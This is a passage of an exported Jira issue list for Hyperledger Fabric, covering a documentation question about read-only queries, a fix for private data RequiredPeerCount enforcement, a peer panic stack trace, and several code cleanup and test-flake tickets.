Customer is seeing read-only query succeeding in their testing. I explain the reasoning as in attached documentation and perhaps we can improve the documentation to state explicitly.

 

Customer wants a reference to an example that shows how to submit a read-only query for ordering - so auditors can be satisfied. Thanks.",,denyeart,pvrbharg,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Feb/20 3:13 AM;pvrbharg;RAFT-ReadOnlyQuery-QuorumIssue.docx;https://jira.hyperledger.org/secure/attachment/18136/RAFT-ReadOnlyQuery-QuorumIssue.docx","22/Feb/20 3:14 AM;pvrbharg;RAFT-ReadOnlyQuery-QuorumIssue.pdf;https://jira.hyperledger.org/secure/attachment/18137/RAFT-ReadOnlyQuery-QuorumIssue.pdf",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019e3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,pvrbharg,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Feb/20 3:14 AM;pvrbharg;[^RAFT-ReadOnlyQuery-QuorumIssue.docx] [^RAFT-ReadOnlyQuery-QuorumIssue.pdf];;;","22/Feb/20 4:20 AM;yacovm;{quote}If a quorum of nodes is unavailable for any reason, *the ordering service cluster* becomes unavailable for both read and write operations on the channel, and no new logs can be committed.{quote}

It means you cannot pull blocks from the nodes because a quorum was lost. It doesn't mean anything about peers. ;;;","22/Feb/20 4:48 AM;pvrbharg;Precisely the point of misunderstanding or mis-interpretation of the statement. They are trying to connect the ordering service cluster health as it relates to their business running without interruption [context is HA, Failover]- which means how this impacts peers submitting transactions and succeeding or failing. This is the context of their test and the result table.

Given above context customers are interpreting and expecting that both invoke and read queries to fail [invoke is failing but not read query]. A read query that goes thru ordering service would fail as well and that would help understand the behavior from transaction submission point of view/peer.

 

So summary:

 

We need to explain what the above statement means - in the context of submissions of transactions - which go thru ordering service and not thru ordering service. So we do not have to keep clarifying and explaining - when customers do their testing and connecting things in a way we did not intend...

 

Hope this helps.

 ;;;","22/Feb/20 4:54 AM;yacovm;[~joe-alewine];;;","22/Feb/20 1:48 PM;pvrbharg;BTW - this is exactly is what has been posted some time ago - Gari and Dave - pretty much word for word.

[https://stackoverflow.com/questions/46253942/read-query-transaction-flow-in-hyperledger-fabric]

Perhaps it would add to enhance understanding if specific configuration steps are explained in say one of samples such as commercial paper in a query to achieve ""

 {{Although not typical, the client application can choose to
submit the read-only transaction for ordering, validation, and commit"" - since commercial paper uses fabric-sdk-node programming model.}}

{{}}

{{Thanks.}};;;","23/Feb/20 1:14 AM;pvrbharg;Dear team,

Update from our engagement:

 

https://hyperledger-fabric.readthedocs.io/en/latest/glossary.html#query

Query:
======

... Although not typical, the client application can choose to submit the read-only transaction for ordering, validation, and commit, for example if the client wants auditable proof on the ledger chain that it had knowledge of specific ledger state at a certain point in time.

Our client wants to understand this flow in the context of how it is being done with Fabric-sdk-node and where it is documented in the documentation or fabric/fabric-samples repo.

Our client is using Fabric v1.4.4 from Open Source and has IBP images with IBM Support [elite]

Please let us know. 
Thanks.;;;","19/Apr/20 12:50 PM;denyeart;Added help-wanted tag in hopes that somebody can pick up this doc clarification, both with respect to the initial orderer statement that caused confusion, and the separate concept of executing/submitting read-only transactions (not typical, but possible). The latter is no different than a read/write transaction and therefore same SDK calls would be made.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Endorsing peer is not honoring RequiredPeerCount for private data dissemination,FAB-17523,44392,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,denyeart,denyeart,denyeart,23/Feb/20 3:53 AM,25/Feb/20 2:54 PM,28/Oct/23 3:09 AM,25/Feb/20 2:54 PM,v1.4.4,v2.0.0,,,,,,,,v1.4.6,v2.0.1,v2.1.0,,fabric-ledger,,,,,,,,,0,,,,,,"If there are not enough known eligible peers to meet a private data collection RequiredPeerCount, endorsement was succeeding rather than returning an error.

This was a regression caused by FAB-15389 in v1.4.4.
FAB-15389 shifted entirely to per-peer dissemination where required peers were tagged up front before dissemination, however there was no overall check to ensure that RequiredPeerCount was met. Prior to FAB-15389, the check was handled deeper in the gossip dissemination. Gossip still checks that each selected required peer disseminates the private data.

This fix adds the overall RequiredPeerCount check for cases where there are not enough known eligible peers.

Also, improvements are made to variable names, error messages, and comments to make dissemination code easier to understand.
",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15389,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwr6z:zz6xj",,,,Unset,Unset,v1.4.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Feb/20 2:19 PM;denyeart;https://github.com/hyperledger/fabric/pull/716  master merged
https://github.com/hyperledger/fabric/pull/729 release-2.0
https://github.com/hyperledger/fabric/pull/733 release-1.4;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Get rid of custom CollectionAccessPolicy mock from private data unit tests,FAB-17524,44393,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,24/Feb/20 7:27 AM,24/Feb/20 2:55 PM,28/Oct/23 3:09 AM,24/Feb/20 2:54 PM,Future,,,,,,,,,v2.1.0,,,,fabric-gossip,,,,,,,,,0,,,,,,Currently unit test of gossip/privdata/distributor.go introduces custom mocks of {{CollectionAccessPolicy}} and {{CollectionAccessFactory}} which need to be replaced with auto generate mocks instead.,,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019er:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),C0rWin,denyeart,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Feb/20 7:42 AM;C0rWin;https://github.com/hyperledger/fabric/pull/719;;;","24/Feb/20 2:54 PM;denyeart;[~C0rWin] Note that master will be for v2.1.0. Merged.
release-2.0 will be fore v2.0.1.
Just explaining... no backport required.;;;","24/Feb/20 2:55 PM;C0rWin;Thanks [~denyeart];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Peer panic with ""panic: inconsistent label cardinality: expected 2 label values but got 0 in prometheus.Labels{}""",FAB-17525,44395,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,24/Feb/20 1:09 PM,24/Feb/20 9:38 PM,28/Oct/23 3:09 AM,24/Feb/20 9:38 PM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-peer,,,,,,,,,0,,,,,,"During integration test for FAB-17523 where peer fails to endorse, I saw peer panic with error ""panic: inconsistent label cardinality: expected 2 label values but got 0 in prometheus.Labels{}"".

The full message:

[e][Org1.peer0] 2020-02-23 22:41:15.141 EST [gossip.service] DistributePrivateData -> ERRO 0c6 failed to distribute private collection, txID c0178e7fb48d0f67865ce3508363c8ab3ea09390ae49ed4b4a407a1c8b27a465, channel testchannel: could not build private data dissemination plan for chaincode marblespHighRequiredPeerCount and collection collectionMarblePrivateDetails: required to disseminate to at least 10 peers, but know of only 2 eligible peers

[e][Org1.peer0] panic: inconsistent label cardinality: expected 2 label values but got 0 in prometheus.Labels{}
[e][Org1.peer0] 
[e][Org1.peer0] goroutine 1137 [running]:
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/github.com/prometheus/client_golang/prometheus.(*CounterVec).With(0xc000010c88, 0xc002b5a210, 0x0, 0xc002b5a210)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/prometheus/client_golang/prometheus/counter.go:217 +0xc2
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/github.com/go-kit/kit/metrics/prometheus.(*Counter).Add(0xc002acd0a0, 0x3ff0000000000000)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/go-kit/kit/metrics/prometheus/prometheus.go:45 +0x5c
[e][Org1.peer0] github.com/hyperledger/fabric/core/endorser.(*Endorser).SimulateProposal(0xc002ace540, 0xc002a54c00, 0xc0037091c0, 0x1d, 0xc002e39310, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:230 +0x7b9
[e][Org1.peer0] github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposalSuccessfullyOrError(0xc002ace540, 0xc002e39360, 0x0, 0x0, 0x0)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:392 +0x433
[e][Org1.peer0] github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal(0xc002ace540, 0x518ea40, 0xc002e557a0, 0xc002e38d20, 0x0, 0x0, 0x0)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:335 +0x380
[e][Org1.peer0] github.com/hyperledger/fabric/core/handlers/auth/filter.(*expirationCheckFilter).ProcessProposal(0xc002aca8e0, 0x518ea40, 0xc002e557a0, 0xc002e38d20, 0x4dbac20, 0x4008500, 0x6e28c78)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/handlers/auth/filter/expiration.go:61 +0x8f
[e][Org1.peer0] github.com/hyperledger/fabric/core/handlers/auth/filter.(*filter).ProcessProposal(0xc002aca880, 0x518ea40, 0xc002e557a0, 0xc002e38d20, 0xc002aca880, 0xc002a33300, 0x203001)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/handlers/auth/filter/filter.go:32 +0x51
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler.func1(0x518ea40, 0xc002e557a0, 0x4ec7980, 0xc002e38d20, 0xc000137dc8, 0x1, 0x4f97c7d, 0x16)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:107 +0x86
[e][Org1.peer0] github.com/hyperledger/fabric/internal/peer/node.unaryGrpcLimiter.func1(0x518ea40, 0xc002e557a0, 0x4ec7980, 0xc002e38d20, 0xc002a73560, 0xc002a73580, 0x0, 0x0, 0x0, 0x0)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/internal/peer/node/grpc_limiters.go:51 +0x3ab
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1(0x518ea40, 0xc002e557a0, 0x4ec7980, 0xc002e38d20, 0x0, 0xc002a736fe, 0x518ea40, 0xc002e557a0)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x63
[e][Org1.peer0] github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1(0x518ea40, 0xc002e55620, 0x4ec7980, 0xc002e38d20, 0xc002a73560, 0xc002a735a0, 0x40cef86, 0x5e5345db, 0xc007a6cd20, 0x7cfb52e73a204)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x286
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1(0x518ea40, 0xc002e55620, 0x4ec7980, 0xc002e38d20, 0x5170880, 0xc0029da6e0, 0x4e414c0, 0x2e738287)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x63
[e][Org1.peer0] github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1(0x518ea40, 0xc002e55620, 0x4ec7980, 0xc002e38d20, 0xc002a73560, 0xc002a735c0, 0x45c27ea, 0x4e688c0, 0xc002a735e0, 0xc002a73560)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x1c9
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1(0x518ea40, 0xc002e55620, 0x4ec7980, 0xc002e38d20, 0xc00010bb00, 0xc002a73500, 0xc002c77a10, 0x400ef98)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x63
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1(0x518ea40, 0xc002e55620, 0x4ec7980, 0xc002e38d20, 0xc002a73560, 0xc002a73580, 0xc002c77a80, 0x41ec688, 0x4e9b280, 0xc002e55620)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xd5
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler(0x4dbac20, 0xc002aca880, 0x518ea40, 0xc002e55620, 0xc0032ae480, 0xc000406030, 0x518ea40, 0xc002e55620, 0xc003424f00, 0x4b4)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:109 +0x14b
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC(0xc000170000, 0x519d9e0, 0xc003864900, 0xc00010bb00, 0xc002a112c0, 0x5b2c080, 0xc002d68400, 0x0, 0x0)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:995 +0x460
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream(0xc000170000, 0x519d9e0, 0xc003864900, 0xc00010bb00, 0xc002d68400)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1275 +0xd97
[e][Org1.peer0] github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1(0xc000492484, 0xc000170000, 0x519d9e0, 0xc003864900, 0xc00010bb00)
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:710 +0xbb
[e][Org1.peer0] created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1
[e][Org1.peer0] 	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:708 +0xa1
",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17357,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019f7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Feb/20 2:31 PM;denyeart;SimulationFailure endorser metrics were being emitted without the
required labels included, causing peer to panic.
The fix adds the required labels.;;;","24/Feb/20 2:34 PM;denyeart;https://github.com/hyperledger/fabric/pull/721;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Simplify PTE,FAB-17526,44397,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,24/Feb/20 11:51 PM,26/Feb/20 1:32 PM,28/Oct/23 3:09 AM,26/Feb/20 1:32 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzus",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Define the Fabric Test Mission,FAB-17527,44398,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,24/Feb/20 11:56 PM,26/Feb/20 11:36 AM,28/Oct/23 3:09 AM,26/Feb/20 11:36 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,This is the overarching spike to define what we expect from Fabric Test,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzuk",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Describe Backup and Recovery strategy,FAB-17528,44399,32076,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,,pandrejko,pandrejko,25/Feb/20 2:35 AM,22/Dec/22 10:23 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,Jason Yellick suggested we include this as a topic inside the Deployment Guide.,,pandrejko,pauldeauna,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019fn:",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,pauldeauna,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cleanup config package,FAB-17529,44401,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,25/Feb/20 5:18 AM,17/Mar/20 4:23 AM,28/Oct/23 3:09 AM,04/Mar/20 12:52 AM,,,,,,,,,,v2.1.0,,,,,,,,,,,,,0,ipm,,,,,"Comments
 * *[TH]* [#761|[https://github.com/hyperledger/fabric/pull/761]] Comments should be clarified (ex. Policy ""encodes"")
 * *[TH]*  [#761|[https://github.com/hyperledger/fabric/pull/761]] Add comments to fields in exported structs
 * *[TH]*  [#761|[https://github.com/hyperledger/fabric/pull/761]] Resources.DefaultModPolicy comments (describe options)
 * Skip as foreign comment mentions instance plus additional clarification on what the field actually means/does
 * *[TH]*  [#761|[https://github.com/hyperledger/fabric/pull/761]] Better comments around addValue
 * Comments for functions in general should consider potential failure paths/behavior and options for parameters or various paths (what does the consumer expect to be returned in various cases)

Errors
 * -*[TH]* [#742|[https://github.com/hyperledger/fabric/pull/742]] Fix errors to be more clear (ex. profile's channel ID is empty), use required over ""is empty""-
 * -*[TH]* [#742|[https://github.com/hyperledger/fabric/pull/742]] Potentially reword some of these errors to be less verbose. See os package errors for examples, try to lessen the amount of chaining of ""failed to ...""-

General
 * -*[CL]* Consortium should just have a name field instead of consortiums being a map from name to consortium-
 * -*[DC]* ([#754|https://github.com/hyperledger/fabric/pull/754]) use generateOrgConfigGroup for orderer/application/consortium org config groups (remove existing functions for new___OrgGroup)-
 * -*[DC]* ([#754|https://github.com/hyperledger/fabric/pull/754]) generateOrgConfigGroup should also have logic for anchor peers-
 * -*[CL]* Compute should become ComputeConfigUpdate,- 
 * -*[CL]* Consistent naming for params (if we call a config ""profile"" we should keep calling it that etc), or clearer naming on what the config applies to-
 * -*[CL]* Consistency and clarity on function names (create vs make vs new vs generate). Consider whether we even need the ""create"" at the beginning of the function-
 * -*[CL]* Use MatchJSON in tests instead of comparing string representation-
 * -*[DC]* ([#754|https://github.com/hyperledger/fabric/pull/754]) Group imports (standard library at top), editor should handle this if you save after removing whitespaces between package imports-

Signing
 * *[WL]* CreateSignatureHeader should not be on the SigningIdentity (just put it in the config package and pass it the identity), same for Serialize
 * *[WL]* Don't export most of the signing stuff
 * Confirm whether we need toLowS for signatures
 * *[WL]* SigningIdentity does not implement crypto.Signer (Sign function parameters are missing)
 * *[WL]* SigningIdentity does not need 3 instances of public key (get from private)
 * *[WL]* NewSigningIdentity constructor does not need to exist
 * *[WL]* Modify types on SigningIdentity (no more pem cert, just provide the x.509)
 * *[WL]* Remove methods for decoding pem
 * *[WL]* MSPId() should be MSPID()
 * *[WL]* SigningIdentity should implement crypto.Signer (add Public() function)
 * *[WL]* Don't need nil check for interfaces (ex. Sign's reader io.Reader)
 * *[WL]* Support handling specific types of identities for signing (ecdsa vs rsa, etc)
 * What does 24 bytes for the nonce mean?
 * *[WL]* Fix spelling of Serialize error
 * *[TH]*  -[#742|[https://github.com/hyperledger/fabric/pull/742]] Remove nil checks in CreateSignedConfigUpdateEnvelope-
 * -*[CL]* createSignedEnvelopeWithTLSBinding channelHeader timestamp might want to use [https://github.com/golang/protobuf/blob/d23c5127dc24889085f8ccea5c9d560a57a879d8/ptypes/timestamp.go#L103]-",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzy1",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Go to 1.13.8,FAB-17530,44402,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,25/Feb/20 5:41 AM,26/Feb/20 11:35 AM,28/Oct/23 3:09 AM,26/Feb/20 11:35 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019gb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Intermittent UT failure in common/cluster: TestSend/Send_step_succeed expected 1, actual 2",FAB-17531,44405,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,sykesm,sykesm,25/Feb/20 6:42 AM,24/Mar/20 10:59 PM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"{code}
2020-02-24T21:16:20.9670651Z --- FAIL: TestSend (0.01s)
2020-02-24T21:16:20.9671046Z     --- FAIL: TestSend/Send_step_succeed (0.00s)
2020-02-24T21:16:20.9671305Z         rpc_test.go:249: 
2020-02-24T21:16:20.9671533Z             	Error Trace:	rpc_test.go:249
2020-02-24T21:16:20.9671790Z             	Error:      	Not equal: 
2020-02-24T21:16:20.9672055Z             	            	expected: 1
2020-02-24T21:16:20.9672293Z             	            	actual  : 2
2020-02-24T21:16:20.9672551Z             	Test:       	TestSend/Send_step_succeed
2020-02-24T21:16:20.9673189Z [34m2020-02-24 21:15:43.785 UTC [test] Configure -> INFO 2f4[0m Entering, channel: test, nodes: [ID: 6,
{code}

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=8355&view=logs&j=ebb37e22-1b6b-50bf-588e-4a3b10a4fc3d&t=5e6c925f-2981-5207-dd06-5e1b24383e25&l=2723",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Feb/20 6:41 AM;sykesm;TestSend-FAIL.log;https://jira.hyperledger.org/secure/attachment/18139/TestSend-FAIL.log",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019gz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove unused parameters from createChannel func,FAB-17532,44406,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,25/Feb/20 7:58 AM,12/Mar/20 8:00 PM,28/Oct/23 3:09 AM,12/Mar/20 8:00 PM,,,,,,,,,,v1.4.6,,,,fabric-peer,,,,,,,,,0,,,,,,"After several refactoring rounds the {{createChannel}} function 

{code}
func (p *Peer) createChannel(
	cid string,
	l ledger.PeerLedger,
	cb *common.Block,
	pluginMapper plugin.Mapper,
	deployedCCInfoProvider ledger.DeployedChaincodeInfoProvider,
	legacyLifecycleValidation plugindispatcher.LifecycleResources,
	newLifecycleValidation plugindispatcher.CollectionAndLifecycleResources,
)
{code}

there is no longer use of 

{code}
	cb *common.Block,
	pluginMapper plugin.Mapper,
{code}

therefore it could be removed.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019h7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),C0rWin,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Feb/20 8:02 AM;C0rWin;https://github.com/hyperledger/fabric/pull/734;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
